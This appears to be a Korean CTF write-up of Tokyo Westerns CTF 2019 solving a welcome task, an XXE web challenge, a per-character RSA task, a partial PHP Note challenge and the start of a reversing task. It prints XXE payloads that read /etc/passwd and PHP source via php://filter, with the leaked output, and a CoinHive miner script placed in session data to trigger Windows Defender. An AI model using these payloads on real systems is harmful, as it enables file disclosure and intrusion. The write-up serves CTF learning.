# Tokyo Westerns CTF 5th 2019
with team `g0pher`. (157 / 1288)  

## Misc
Welcome!!(23pt)

## Web
j2x2j(59pt)

## Crypto
real-baby-rsa(40pt)
PHP Note(320pt)

## Reverse
Easy Crack Me(88pt)

## Pwn
nothing more to say(78pt)


# Welcome!!
## Problem
The flag is TWCTF{Welcome_to_TWCTF_2019!!!}.

## Flag
`TWCTF{Welcome_to_TWCTF_2019!!!}`

# j2x2j
## Problem
[Here](http://j2x2j.chal.ctf.westerns.tokyo/) is useful tool for you.

## Play
주어진 링크에 접속하면 `JSON to XML`와 `XML to JSON` 기능이 있는 홈페이지가 뜬다. 아래와 같이 동작한다.
```json
{
    "glossary": {
        "title": "example glossary",
        "GlossDiv": {
            "title": "S",
            "GlossList": {
                "GlossEntry": {
                    "ID": "SGML",
                    "SortAs": "SGML",
                    "GlossTerm": "Standard Generalized Markup Language",
                    "Acronym": "SGML",
                    "Abbrev": "ISO 8879:1986",
                    "GlossDef": {
                        "para": "A meta-markup language, used to create markup languages such as DocBook.",
                        "GlossSeeAlso": ["GML", "XML"]
                    },
                    "GlossSee": "markup"
                }
            }
        }
    }
}
```
```XML
<?xml version="1.0"?>
<root>
  <glossary>
    <title>example glossary</title>
    <GlossDiv>
      <title>S</title>
      <GlossList>
        <GlossEntry>
          <ID>SGML</ID>
          <SortAs>SGML</SortAs>
          <GlossTerm>Standard Generalized Markup Language</GlossTerm>
          <Acronym>SGML</Acronym>
          <Abbrev>ISO 8879:1986</Abbrev>
          <GlossDef>
            <para>A meta-markup language, used to create markup languages such as DocBook.</para>
            <GlossSeeAlso>GML</GlossSeeAlso>
            <GlossSeeAlso>XML</GlossSeeAlso>
          </GlossDef>
          <GlossSee>markup</GlossSee>
        </GlossEntry>
      </GlossList>
    </GlossDiv>
  </glossary>
</root>
```
위와 같이 두 코드는 서로 변환되는 같은 코드다. XML을 JSON으로 변환하는 과정에서 XXE(XML eXternal Entities)를 이용해서 LFI로 flag를 읽는것이 가능하다고 생각했다. 
``` XML
<?xml version="1.0"?>
<!DOCTYPE d [<!ENTITY e SYSTEM "/etc/passwd">]>
<root>&e;</root>
```
```json
{
    "0": "root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nlxd:x:105:65534::\/var\/lib\/lxd\/:\/bin\/false\nuuidd:x:106:110::\/run\/uuidd:\/usr\/sbin\/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nlandscape:x:108:112::\/var\/lib\/landscape:\/usr\/sbin\/nologin\nsshd:x:109:65534::\/run\/sshd:\/usr\/sbin\/nologin\npollinate:x:110:1::\/var\/cache\/pollinate:\/bin\/false\n_chrony:x:111:115:Chrony daemon,,,:\/var\/lib\/chrony:\/usr\/sbin\/nologin\nubuntu:x:1000:1000:Ubuntu:\/home\/ubuntu:\/bin\/bash\ntw:x:1001:1002::\/home\/tw:\/bin\/bash\ngoogle-fluentd:x:112:116::\/home\/google-fluentd:\/usr\/sbin\/nologin\n"
}
```
`/etc/passwd`를 XXE로 읽어낼 수 있었고, 현재 페이지인 `./index.php`를 읽어보려고 했으나 읽히지 않았다. 그래서 `php wrapper` 중 `php://`를 이용해서 index.php를 base64 인코딩 한 문자를 읽어들였다.
```xml
<?xml version="1.0"?>
<!DOCTYPE d [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=./index.php">]>
<root>&e;</root>
```
```json
{
    "0": "PD9waHAKaW5jbHVkZSAnZmxhZy5waHAnOwoKJG1ldGhvZCA9ICRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddOwoKZnVuY3Rpb24gZGllNDA0KCRtc2cpIHsKICBodHRwX3Jlc3BvbnNlX2NvZGUoNDA0KTsKICBkaWUoJG1zZyk7Cn0KCmZ1bmN0aW9uIGNoZWNrX3R5cGUoJG9iaikgewogIGlmIChpc19hcnJheSgkb2JqKSkgewogICAgJGtleV9pc19zdHIgPSBmdW5jdGlvbigkb2JqKSB7CiAgICAgIGZvcmVhY2goJG9iaiBhcyAka2V5PT4kdmFsKSB7CiAgICAgICAgaWYgKGlzX2ludCgka2V5KSkKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQogICAgICByZXR1cm4gdHJ1ZTsKICAgIH07CiAgICAKICAgIGlmICgka2V5X2lzX3N0cigkb2JqKSkgewogICAgICByZXR1cm4gJ29iamVjdCc7CiAgICB9CiAgICBlbHNlIHsKICAgICAgcmV0dXJuICdhcnJheSc7CiAgICB9CiAgfQogIGVsc2UgewogICAgcmV0dXJuIGdldHR5cGUoJG9iaik7CiAgfQp9CgpmdW5jdGlvbiBqc29uMnhtbCgkb2JqKSB7CiAgJHJlcyA9ICcnOwogCiAgaWYgKGlzX2FycmF5KCRvYmopKSB7CiAgICBmb3JlYWNoKCRvYmogYXMgJGtleSA9PiAkdmFsKSB7CiAgICAgIHN3aXRjaChjaGVja190eXBlKCR2YWwpKSB7CiAgICAgICAgY2FzZSAnYXJyYXknOgogICAgICAgICAgZm9yZWFjaCgkdmFsIGFzICR2KSB7CiAgICAgICAgICAgICRyZXMgLj0gIjwka2V5PiI7CiAgICAgICAgICAgICRyZXMgLj0ganNvbjJ4bWwoJHYpOwogICAgICAgICAgICAkcmVzIC49ICI8LyRrZXk+IjsKICAgICAgICAgIH0KICAgICAgICAgIGJyZWFrOwogICAgICAgIGRlZmF1bHQ6IC8vIG9iamVjdCBvciBwcmltaXRpdmUKICAgICAgICAgICRyZXMgLj0gIjwka2V5PiI7CiAgICAgICAgICAkcmVzIC49IGpzb24yeG1sKCR2YWwpOwogICAgICAgICAgJHJlcyAuPSAiPC8ka2V5PiI7CiAgICAgICAgICBicmVhazsKICAgICAgfQogICAgfQogIH0KICBlbHNlIHsKICAgICRyZXMgPSAoc3RyaW5nKSRvYmo7CiAgfQogIHJldHVybiAkcmVzOwp9CgoKaWYgKCRtZXRob2QgPT09ICdQT1NUJykgewogICRqc29uc3RyID0gJF9QT1NUWydqc29uJ107CiAgJHhtbHN0ciA9ICRfUE9TVFsneG1sJ107CgogIGlmICghKGVtcHR5KCR4bWxzdHIpIF4gZW1wdHkoJGpzb25zdHIpKSkgewogICAgZGllNDA0KCc0MDQnKTsKICB9CgogIGlmICghZW1wdHkoJGpzb25zdHIpKSB7CiAgICAkb2JqID0ganNvbl9kZWNvZGUoJGpzb25zdHIsIHRydWUpOwogICAgaWYgKGVtcHR5KCRvYmopKSB7CiAgICAgIGRpZSgnZmFpbGVkIHRvIGRlY29kZSBqc29uJyk7CiAgICB9CiAgICAkZG9jID0gbmV3IERPTURvY3VtZW50KCcxLjAnKTsKICAgICRkb2MtPmZvcm1hdE91dHB1dCA9IHRydWU7CiAgICAkX29iaiA9IGFycmF5KCk7CiAgICAkX29ialsncm9vdCddID0gJG9iajsKICAgICRkb2MtPmxvYWRYTUwoanNvbjJ4bWwoJF9vYmopKTsKICAgIGVjaG8gJGRvYy0+c2F2ZVhNTCgpOwogIH0KCiAgaWYgKCFlbXB0eSgkeG1sc3RyKSkgewogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlcihmYWxzZSk7CiAgICAkb2JqID0gc2ltcGxleG1sX2xvYWRfc3RyaW5nKCR4bWxzdHIsICdTaW1wbGVYTUxFbGVtZW50JywgTElCWE1MX05PRU5UKTsKICAgIGlmIChlbXB0eSgkb2JqKSkgewogICAgICBkaWUoJ2ZhaWxlZCB0byBkZWNvZGUgeG1sJyk7CiAgICB9CiAgICBlY2hvIGpzb25fZW5jb2RlKCRvYmosIEpTT05fUFJFVFRZX1BSSU5UKTsKICB9Cn0KZWxzZSB7Cj8+CjwhZG9jdHlwZSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDx0aXRsZT5KU09OIDwtPiBYTUwgQ29udmVydGVyPC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8dGV4dGFyZWEgaWQ9Impzb24iIG5hbWU9Impzb24iIHJvd3M9IjUwIiBjb2xzPSI4MCI+CiAgICA8L3RleHRhcmVhPgoKICAgIDxpbnB1dCB0eXBlPSJidXR0b24iIGlkPSJ4MmoiIHZhbHVlPSI8LSIvPgogICAgPGlucHV0IHR5cGU9ImJ1dHRvbiIgaWQ9ImoyeCIgdmFsdWU9Ii0+Ii8+CgogICAgPHRleHRhcmVhIGlkPSJ4bWwiIG5hbWU9InhtbCIgcm93cz0iNTAiIGNvbHM9IjgwIj4KICAgIDwvdGV4dGFyZWE+CgogICAgPHNjcmlwdAogICAgICBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjIuMS5taW4uanMiCiAgICAgIGludGVncml0eT0ic2hhMjU2LWh3ZzRnc3hnRlpoT3NFRWFtZE9ZR0JmMTNGeVF1aVR3bEFRZ3hWU05ndDQ9IgogICAgICBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQ+CiAgICAgICQuZ2V0KCcvc2FtcGxlLmpzb24nLCBmdW5jdGlvbihkYXRhKSB7CiAgICAgICAgJCgnI2pzb24nKS52YWwoZGF0YSk7CiAgICAgIH0sICd0ZXh0Jyk7CgogICAgICAkKCcjajJ4Jykub24oJ2NsaWNrJywgZnVuY3Rpb24oKSB7CiAgICAgICAgJC5wb3N0KCcvJywgewogICAgICAgICAganNvbjogJCgnI2pzb24nKS52YWwoKQogICAgICAgIH0sIGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICQoJyN4bWwnKS52YWwoZGF0YSk7CiAgICAgICAgfSk7CiAgICAgIH0pOwoKICAgICAgJCgnI3gyaicpLm9uKCdjbGljaycsIGZ1bmN0aW9uKCkgewogICAgICAgICQucG9zdCgnLycsIHsKICAgICAgICAgIHhtbDogJCgnI3htbCcpLnZhbCgpCiAgICAgICAgfSwgZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgJCgnI2pzb24nKS52YWwoZGF0YSk7CiAgICAgICAgfSk7CiAgICAgIH0pOwogICAgPC9zY3JpcHQ+CiAgPC9ib2R5Pgo8L2h0bWw+Cjw\/cGhwCn0K"
}
```
이를 복호화하면 아래와 같은 코드가 나온다.
``` php
<?php
include 'flag.php';

$method = $_SERVER['REQUEST_METHOD'];

function die404($msg) {
  http_response_code(404);
  die($msg);
}

function check_type($obj) {
  if (is_array($obj)) {
    $key_is_str = function($obj) {
      foreach($obj as $key=>$val) {
        if (is_int($key))
          return false;
      }
      return true;
    };
    
    if ($key_is_str($obj)) {
      return 'object';
    }
    else {
      return 'array';
    }
  }
  else {
    return gettype($obj);
  }
}

function json2xml($obj) {
  $res = '';
 
  if (is_array($obj)) {
    foreach($obj as $key => $val) {
      switch(check_type($val)) {
        case 'array':
          foreach($val as $v) {
            $res .= "<$key>";
            $res .= json2xml($v);
            $res .= "</$key>";
          }
          break;
        default: // object or primitive
          $res .= "<$key>";
          $res .= json2xml($val);
          $res .= "</$key>";
          break;
      }
    }
  }
  else {
    $res = (string)$obj;
  }
  return $res;
}


if ($method === 'POST') {
  $jsonstr = $_POST['json'];
  $xmlstr = $_POST['xml'];

  if (!(empty($xmlstr) ^ empty($jsonstr))) {
    die404('404');
  }

  if (!empty($jsonstr)) {
    $obj = json_decode($jsonstr, true);
    if (empty($obj)) {
      die('failed to decode json');
    }
    $doc = new DOMDocument('1.0');
    $doc->formatOutput = true;
    $_obj = array();
    $_obj['root'] = $obj;
    $doc->loadXML(json2xml($_obj));
    echo $doc->saveXML();
  }

  if (!empty($xmlstr)) {
    libxml_disable_entity_loader(false);
    $obj = simplexml_load_string($xmlstr, 'SimpleXMLElement', LIBXML_NOENT);
    if (empty($obj)) {
      die('failed to decode xml');
    }
    echo json_encode($obj, JSON_PRETTY_PRINT);
  }
}
else {
?>
<!doctype html>
<html>
  <head>
    <title>JSON <-> XML Converter</title>
  </head>
  <body>
    <textarea id="json" name="json" rows="50" cols="80">
    </textarea>

    <input type="button" id="x2j" value="<-"/>
    <input type="button" id="j2x" value="->"/>

    <textarea id="xml" name="xml" rows="50" cols="80">
    </textarea>

    <script
      src="https://code.jquery.com/jquery-3.2.1.min.js"
      integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
      crossorigin="anonymous"></script>
    <script>
      $.get('/sample.json', function(data) {
        $('#json').val(data);
      }, 'text');

      $('#j2x').on('click', function() {
        $.post('/', {
          json: $('#json').val()
        }, function(data) {
          $('#xml').val(data);
        });
      });

      $('#x2j').on('click', function() {
        $.post('/', {
          xml: $('#xml').val()
        }, function(data) {
          $('#json').val(data);
        });
      });
    </script>
  </body>
</html>
<?php
}
```
2번째 줄에 `include 'flag.php';`로 보아 flag.php가 존재함을 알 수 있고, 같은 방법으로 코드를 뽑아보면 아래와 같은 소스가 나온다.
``` php
<?php
$flag = 'TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}';
```

## Flag
`TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}`

# real-baby-rsa
## Problem
[real-baby-rsa.7z](https://score.ctf.westerns.tokyo/attachments/2/real-baby-rsa-037dd23e2f3b23038ee248487817bc1ad6636e1057e671826bea4e03a9acc79e.7z)

## Play
압축을 풀면 `problem.py`와 `output` 파일이 주어진다. 코드는 다음과 같다.  
``` python
flag = 'TWCTF{CENSORED}'

# Public Parameters
N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091
e = 65537

# Encrypt the flag!
for char in flag:
    print(pow(ord(char), e, N))
```
flag라는 값이 있고, N과 e를 통해 정확히 `pow(ord(char), e, N)` 라는 로직을 통해 flag를 한글자씩 암호화 한다. 암호화 과정을 알고 있기 때문에 같은 방법으로 출력 가능한 문자를 암호화 해서 디코드 테이블을 만들 수 있다.
```python
import string

N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091
e = 65537

# 모든 문자에 대한 디코드 테이블
decode_table = {}
for i in string.printable:
            decode_table[str(pow(ord(i),e,N))] = i
            

f = open("output","r")
lst = f.read().split("\n")

#디코드 테이블에서 해당 원본 문자를 복구
print("".join(decode_table[i] for i in lst))	
```

## Flag
`TWCTF{padding_is_important}`

# PHP Note
## Problem
http://phpnote.chal.ctf.westerns.tokyo/

## Play
`/?action=index`로 자동으로 접속이 되며, 로그인 페이지가 뜬다. `First Name`, `Last Name` 그리고 `nickname`을 입력하면 로그인이 된다. 글을 쓰면 글이 올라간다. 기능은 이게 전부다. 소스코드를 살펴보면 action에 `source`를 넘겨주면 소스코드를 준다. 아래는 해당 소스코드다.
``` php
<?php
include 'config.php';

class Note {
    public function __construct($admin) {
        $this->notes = array();
        $this->isadmin = $admin;
    }

    public function addnote($title, $body) {
        array_push($this->notes, [$title, $body]);
    }

    public function getnotes() {
        return $this->notes;
    }

    public function getflag() {
        if ($this->isadmin === true) {
            echo FLAG;
        }
    }
}

function verify($data, $hmac) {
    $secret = $_SESSION['secret'];
    if (empty($secret)) return false;
    return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);
}

function hmac($data) {
    $secret = $_SESSION['secret'];
    if (empty($data) || empty($secret)) return false;
    return hash_hmac('sha256', $data, $secret);
}

function gen_secret($seed) {
    return md5(SALT . $seed . PEPPER);
}

function is_login() {
    return !empty($_SESSION['secret']);
}

function redirect($action) {
    header("Location: /?action=$action");
    exit();
}

$method = $_SERVER['REQUEST_METHOD'];
$action = $_GET['action'];

if (!in_array($action, ['index', 'login', 'logout', 'post', 'source', 'getflag'])) {
    redirect('index');
}

if ($action === 'source') {
    highlight_file(__FILE__);
    exit();
}


session_start();

if (is_login()) {
    $realname = $_SESSION['realname'];
    $nickname = $_SESSION['nickname'];
    
    $note = verify($_COOKIE['note'], $_COOKIE['hmac'])
            ? unserialize(base64_decode($_COOKIE['note']))
            : new Note(false);
}

if ($action === 'login') {
    if ($method === 'POST') {
        $nickname = (string)$_POST['nickname'];
        $realname = (string)$_POST['realname'];

        if (empty($realname) || strlen($realname) < 8) {
            die('invalid name');
        }

        $_SESSION['realname'] = $realname;
        if (!empty($nickname)) {
            $_SESSION['nickname'] = $nickname;
        }
        $_SESSION['secret'] = gen_secret($nickname);
    }
    redirect('index');
}

if ($action === 'logout') {
    session_destroy();
    redirect('index');
}

if ($action === 'post') {
    if ($method === 'POST') {
        $title = (string)$_POST['title'];
        $body = (string)$_POST['body'];
        $note->addnote($title, $body);
        $data = base64_encode(serialize($note));
        setcookie('note', (string)$data);
        setcookie('hmac', (string)hmac($data));
    }
    redirect('index');
}

if ($action === 'getflag') {
    $note->getflag();
}

?>
<!doctype html>
<html>
    <head>
        <title>PHP note</title>
    </head>
    <style>
        textarea {
            resize: none;
            width: 300px;
            height: 200px;
        }
    </style>
    <body>
        <?php
        if (!is_login()) {
            $realname = htmlspecialchars($realname);
            $nickname = htmlspecialchars($nickname);
        ?>
        <form action="/?action=login" method="post" id="login">
            <input type="text" id="firstname" placeholder="First Name">
            <input type="text" id="lastname" placeholder="Last Name">
            <input type="text" name="nickname" id="nickname" placeholder="nickname">
            <input type="hidden" name="realname" id="realname">
            <button type="submit">Login</button>
        </form>
        <?php
        } else {
        ?>
        <h1>Welcome, <?=$realname?><?= !empty($nickname) ? " ($nickname)" : "" ?></h1>
        <a href="/?action=logout">logout</a>
        <!-- <a href="/?action=source">source</a> -->
        <br/>
        <br/>
        <?php
            foreach($note->getnotes() as $k => $v) {
                list($title, $body) = $v;
                $title = htmlspecialchars($title);
                $body = htmlspecialchars($body);
        ?>
        <h2><?=$title?></h2>
        <p><?=$body?></p>
        <?php
            }
        ?>
        <form action="/?action=post" method="post">
            <input type="text" name="title" placeholder="title">
            <br>
            <textarea name="body" placeholder="body"></textarea>
            <button type="submit">Post</button>
        </form>
        <?php
        }
        ?>
        <?php
        ?>
        <script>
            document.querySelector("form#login").addEventListener('submit', (e) => {
                const nickname = document.querySelector("input#nickname")
                const firstname = document.querySelector("input#firstname")
                const lastname = document.querySelector("input#lastname")
                document.querySelector("input#realname").value = `${firstname.value} ${lastname.value}`
                if (nickname.value.length == 0 && firstname.value.length > 0 && lastname.value.length > 0) {
                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()
                }
            })
        </script>
    </body>
</html>
```
가장 먼저 발견한 취약점은 `serialize, unserialize` 부분이다. serialize된 데이터를 base64 인코딩해서 cookie에 담는다. 이 데이터를 서버에서 unserialize해서 사용한다. 즉, 우리가 원하는 데이터를 `base64_encode(serialize
(hack_value))` 과정을 거치서 쿠키에 넣으면 서버에서 처리하는 변수에 우리가 원하는 값을 넣을 수 있다. 아래는 해당 로직 코드다.
```php
class Note {
    public function __construct($admin) {
        $this->notes = array();
        $this->isadmin = $admin;
    }

    public function addnote($title, $body) {
        array_push($this->notes, [$title, $body]);
    }

    public function getnotes() {
        return $this->notes;
    }

    public function getflag() {
        if ($this->isadmin === true) {
            echo FLAG; // 코드 흐름이 여기에 도달해야한다.
        }
    }
}

function verify($data, $hmac) { // True를 리턴해야한다.
    $secret = $_SESSION['secret'];
    if (empty($secret)) return false;
    return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);
}


(...)


if (is_login()) {
    $realname = $_SESSION['realname'];
    $nickname = $_SESSION['nickname'];
    
    $note = verify($_COOKIE['note'], $_COOKIE['hmac'])
            ? unserialize(base64_decode($_COOKIE['note'])) // 돌파구!
            : new Note(false);
}

(...)
```
unserialize를 통해 로직이 취약할 가능성은 알았으나, 취약한 로직인 `unserialize(base64_decode($_COOKIE['note']))`가 실행되기 위해서는 `verify($_COOKIE['note'], $_COOKIE['hmac'])` 코드가 변조된 `COOKIE['note']`가 들어갔을 때도 True를 반환해야 한다. 그러나 verify 함수에서 볼 수 있듯이 세션의 secret 값을 알아야 한다. secret 값을 만드는 md5 함수를 공략해봤지만 소득이 없어 보류해야 했다.  

이후 패킷을 보았고, 응답 헤더를 보면 다음과 같은 내용을 볼 수 있다.
``` json
(...)
Date: Thu, 05 Sep 2019 14:27:51 GMT
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.9
(...)
```
서버정보가 노출되는것을 볼 수 있고, 윈도우 서버를 사용하고 있음을 알 수 있다. 만약 우리가 세션에 악성 스크립트를 삽입한다면 `Windows Defender`가 이를 탐지해서 로그인에 실패하게 된다. Windows Defender가 세션을 검사하는 이유는 세션이 특정 포맷에 맞추어 파일로 생성되기 때문이다.
```php
$_SESSION['realname'] = $realname;
if (!empty($nickname)) {
  $_SESSION['nickname'] = $nickname;
}
$_SESSION['secret'] = gen_secret($nickname);
```
문제 코드와 같이 세션이 생성이 된다면 세션은 다음과 같이 서버에 파일로 저장된다.  
`realname|s:13:"Lee Jae Seung";nickname|s:6:"g0pher";secret|s:13:"_secret_code_";`  
우리가 수정가능한 부분은 `realname`과 `nickname`이다. 여기서 알아야할 점은 Windows Defender가 `Javascript`엔진을 포함하고 있어서 `var miner=new CoinHive.User();miner.start()`와 같은 악성 스크립트 포함 여부를 확인할 수 있다는 것이다. 
```html
`realname|s:13:"<script>var miner=new CoinHive.User();miner.start()</script><body>";nickname|s:6:"</body>";secret|s:13:"_secret_code_";`
```
위와 같은 세션을 만들어냈을 때, Windows Defender가 동작중이라면 탐지하고 차단해서 로그인이 되지 않을 것이다.
```
First Name : "<script>var miner=new CoinHive.User();miner.start()</script>"
Last Name : "<body>"
nickname : "</body>"
```
실제로 위와 같은 데이터로 로그인해보면 에러 페이지도 뜨지 않고 로그인이 되지 않는다. 





## Flag


# Easy Crack Me
## Problem
Cracking is easy for you.  

[easy_crack_me](https://score.ctf.westerns.tokyo/attachments/3/easy_crack_me-768bbdb6d3c597598d0f0c913941e4e3523af09bcfcff117f81e27158d783b3f)
## Play
ELF파일이어서 IDA로 열었다. 아래는 Pseudocode다.
``` c
signed __int64 __fastcall main(int a1, char **a2, char **a3)
{
  signed __int64 result; // rax
  char *j; // rax
  char v5; // ST1F_1
  char v6; // ST1E_1
  char v7; // [rsp+1Dh] [rbp-1B3h]
  signed int i; // [rsp+20h] [rbp-1B0h]
  signed int k; // [rsp+24h] [rbp-1ACh]
  int v10; // [rsp+28h] [rbp-1A8h]
  int v11; // [rsp+2Ch] [rbp-1A4h]
  signed int l; // [rsp+30h] [rbp-1A0h]
  signed int m; // [rsp+34h] [rbp-19Ch]
  int v14; // [rsp+38h] [rbp-198h]
  int v15; // [rsp+3Ch] [rbp-194h]
  signed int n; // [rsp+40h] [rbp-190h]
  signed int ii; // [rsp+44h] [rbp-18Ch]
  int v18; // [rsp+48h] [rbp-188h]
  signed int jj; // [rsp+4Ch] [rbp-184h]
  char *s; // [rsp+58h] [rbp-178h]
  __int64 v21; // [rsp+70h] [rbp-160h]
  __int64 v22; // [rsp+78h] [rbp-158h]
  __int64 v23; // [rsp+80h] [rbp-150h]
  __int64 v24; // [rsp+88h] [rbp-148h]
  __int64 v25; // [rsp+90h] [rbp-140h]
  __int64 v26; // [rsp+98h] [rbp-138h]
  __int64 v27; // [rsp+A0h] [rbp-130h]
  __int64 v28; // [rsp+A8h] [rbp-128h]
  __int64 v29; // [rsp+B0h] [rbp-120h]
  __int64 v30; // [rsp+B8h] [rbp-118h]
  __int64 v31; // [rsp+C0h] [rbp-110h]
  __int64 v32; // [rsp+C8h] [rbp-108h]
  __int64 v33; // [rsp+D0h] [rbp-100h]
  __int64 v34; // [rsp+D8h] [rbp-F8h]
  __int64 v35; // [rsp+E0h] [rbp-F0h]
  __int64 v36; // [rsp+E8h] [rbp-E8h]
  __int64 s1; // [rsp+F0h] [rbp-E0h]
  __int64 v38; // [rsp+F8h] [rbp-D8h]
  __int64 v39; // [rsp+100h] [rbp-D0h]
  __int64 v40; // [rsp+108h] [rbp-C8h]
  __int64 v41; // [rsp+110h] [rbp-C0h]
  __int64 v42; // [rsp+118h] [rbp-B8h]
  __int64 v43; // [rsp+120h] [rbp-B0h]
  __int64 v44; // [rsp+128h] [rbp-A8h]
  int v45[32]; // [rsp+130h] [rbp-A0h]
  __int64 v46; // [rsp+1B0h] [rbp-20h]
  __int64 v47; // [rsp+1B8h] [rbp-18h]
  unsigned __int64 v48; // [rsp+1C8h] [rbp-8h]

  v48 = __readfsqword(0x28u);
  if ( a1 == 2 )
  {
    s = a2[1];
    if ( strlen(a2[1]) != 39 )
    {
      puts("incorrect");
      exit(0);
    }
    if ( memcmp(s, "TWCTF{", 6uLL) || s[38] != 125 )
    {
      puts("incorrect");
      exit(0);
    }
    s1 = 0LL;
    v38 = 0LL;
    v39 = 0LL;
    v40 = 0LL;
    v41 = 0LL;
    v42 = 0LL;
    v43 = 0LL;
    v44 = 0LL;
    v46 = 3978425819141910832LL;
    v47 = 7378413942531504440LL;
    for ( i = 0; i <= 15; ++i )
    {
      for ( j = strchr(s, *((char *)&v46 + i)); j; j = strchr(j + 1, *((char *)&v46 + i)) )
        ++*((_DWORD *)&s1 + i);
    }
    if ( memcmp(&s1, &unk_400F00, 0x40uLL) )
    {
      puts("incorrect");
      exit(0);
    }
    v21 = 0LL;
    v22 = 0LL;
    v23 = 0LL;
    v24 = 0LL;
    v25 = 0LL;
    v26 = 0LL;
    v27 = 0LL;
    v28 = 0LL;
    for ( k = 0; k <= 7; ++k )
    {
      v10 = 0;
      v11 = 0;
      for ( l = 0; l <= 3; ++l )
      {
        v5 = s[4 * k + 6 + l];
        v10 += v5;
        v11 ^= v5;
      }
      *((_DWORD *)&v21 + k) = v10;
      *((_DWORD *)&v25 + k) = v11;
    }
    v29 = 0LL;
    v30 = 0LL;
    v31 = 0LL;
    v32 = 0LL;
    v33 = 0LL;
    v34 = 0LL;
    v35 = 0LL;
    v36 = 0LL;
    for ( m = 0; m <= 7; ++m )
    {
      v14 = 0;
      v15 = 0;
      for ( n = 0; n <= 3; ++n )
      {
        v6 = s[8 * n + 6 + m];
        v14 += v6;
        v15 ^= v6;
      }
      *((_DWORD *)&v29 + m) = v14;
      *((_DWORD *)&v33 + m) = v15;
    }
    if ( memcmp(&v21, &unk_400F40, 0x20uLL) || memcmp(&v25, &unk_400F60, 0x20uLL) )
    {
      puts("incorrect");
      exit(0);
    }
    if ( memcmp(&v29, &unk_400FA0, 0x20uLL) || memcmp(&v33, &unk_400F80, 0x20uLL) )
    {
      puts("incorrect");
      exit(0);
    }
    memset(v45, 0, sizeof(v45));
    for ( ii = 0; ii <= 31; ++ii )
    {
      v7 = s[ii + 6];
      if ( v7 <= 47 || v7 > 57 )
      {
        if ( v7 <= 96 || v7 > 102 )
          v45[ii] = 0;
        else
          v45[ii] = 128;
      }
      else
      {
        v45[ii] = 255;
      }
    }
    if ( memcmp(v45, &unk_400FC0, 0x80uLL) )
    {
      puts("incorrect");
      exit(0);
    }
    v18 = 0;
    for ( jj = 0; jj <= 15; ++jj )
      v18 += s[2 * (jj + 3)];
    if ( v18 != 1160 )
    {
      puts("incorrect");
      exit(0);
    }
    if ( s[37] != 53 || s[7] != 102 || s[11] != 56 || s[12] != 55 || s[23] != 50 || s[31] != 52 )
    {
      puts("incorrect");
      exit(0);
    }
    printf("Correct: %s\n", s, a2);
    result = 0LL;
  }
  else
  {
    fwrite("./bin flag_is_here", 1uLL, 0x12uLL, stderr);
    result = 1LL;
  }
  return result;
}
```
